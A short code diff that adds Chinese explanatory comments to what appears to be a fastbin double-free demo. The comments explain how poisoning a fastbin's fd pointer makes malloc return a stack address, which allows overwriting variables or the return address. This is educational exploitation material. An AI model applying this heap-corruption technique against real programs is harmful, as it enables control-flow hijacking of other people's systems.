@@ -44,7 +44,11 @@ int main()
 	stack_var = 0x20;
 
 	printf("Now, we overwrite the first 8 bytes of the data at %p to point right after the 0x20.\n", a);
-	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
+	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));     //由于前面两次释放a，所以再次申请的d指针，指向了a，
+								         //某一个申请块的fd 和 bk, 然后将栈的地址写进去了，
+									 //由于链表fastbins，是单链表，通过fd指向，寻找申请的内存地址
+									 //所以再次malloc,会返回栈的地址
+								         //只要能算清楚，变量或者ret的地址都可以修改
 
 	printf("3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
 	printf("4rd malloc(8): %p\n", malloc(8));
